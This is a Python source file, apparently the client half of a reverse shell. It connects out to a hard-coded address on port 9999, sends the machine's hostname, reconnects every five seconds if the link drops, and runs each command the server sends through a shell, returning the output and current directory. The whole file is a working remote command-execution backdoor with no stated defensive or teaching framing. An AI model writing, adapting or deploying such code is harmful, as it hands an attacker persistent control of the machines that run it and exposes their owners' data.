import os
import socket
import subprocess
import time
import signal
import sys
import struct
import platform


# Creates a client object with methods and attributes, the attributes are static as they will always point to the same
# IP address and port number, this will not connect to the server if the server is not listening for connections on the
# specified IP and port number.

class Client:
    def __init__(self):
        self.server_host = "192.168.7.6"
        self.server_port = 9999
        self.client_socket = None

    # Listens for Ctrl C inputs and when it is received calls a method called shutdown_client

    def setup_signal_handlers(self):
        signal.signal(signal.SIGINT, self.shutdown_client)
        signal.signal(signal.SIGTERM, self.shutdown_client)

    # Closes down the program when it receives a Ctrl C input, also closes down the client socket.

    def shutdown_client(self, signal_received=None, frame=None):
        if self.client_socket:
            try:
                self.client_socket.shutdown(socket.SHUT_RDWR)
                self.client_socket.close()
            except OSError:
                pass
        sys.exit(0)

    # Creates the client socket and connects to the server socket thus creating a connection for communication

    def create__client_socket_and_connect(self):
        while True:
            try:
                self.client_socket = socket.socket()
                self.client_socket.connect((self.server_host, self.server_port))
                client_hostname = socket.gethostname()
                self.client_socket.send(client_hostname.encode())
                break
            except OSError:
                time.sleep(5)

    # Gets the current working directory and sends that as well as any command output back to the server

    def send_output(self, command_output):
        current_directory = os.getcwd()
        message_to_be_sent_to_server = f"{command_output}{current_directory} > "
        self.client_socket.send(struct.pack('>I', len(message_to_be_sent_to_server)) +
                                message_to_be_sent_to_server.encode())

    # Receives commands and passes them to the execute_command function, if the command is cd then it is not sent to
    # the execute_command function but instead the directory is changed and a blank output plus the new directory
    # is sent to the server.

    def handle_commands(self):
        while True:
            try:
                received_server_data = self.client_socket.recv(20480)
                if not received_server_data:
                    break
                # Need to add a random ID to each message so server can handle it
                if received_server_data.decode("utf-8") == "ping":
                    self.client_socket.send("pong".encode("utf-8"))
                else:
                    if received_server_data[:2].decode("utf-8") == 'cd':
                        current_path = received_server_data[3:].decode("utf-8").strip()
                        try:
                            os.chdir(current_path)
                            self.send_output("")
                        except Exception as e:
                            self.send_output(f"Directory change failed: {e}\n")
                    elif received_server_data.decode("utf-8") == "quit":
                        break
                    else:
                        self.execute_command(received_server_data.decode("utf-8"))
            except OSError:
                break
        self.client_socket.close()

    # Creates a subprocess to execute the received command and then captures its output so that it can be returned to
    # the server. If the output has a non utf-8 character or there is an error then it will be replaced so that the
    # response can still be sent back to the server.

    def execute_command(self, command):
        command_execution = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                             stdin=subprocess.PIPE)
        command_output, command_error = command_execution.communicate()
        decoded_output = command_output.decode("utf-8", "replace")
        decoded_error = command_error.decode("utf-8", "replace")
        self.send_output(decoded_output + decoded_error)


# Creates a client instance and sets up the signal handlers to handle shutdowns, also attempts to create a client socket
# and execute any received commands, will keep attempting to do this for as long as the program is running.

def main():
    client = Client()
    client.setup_signal_handlers()
    while True:
        client.create__client_socket_and_connect()
        client.handle_commands()


# Calls the main function to start the program

if __name__ == '__main__':
    main()
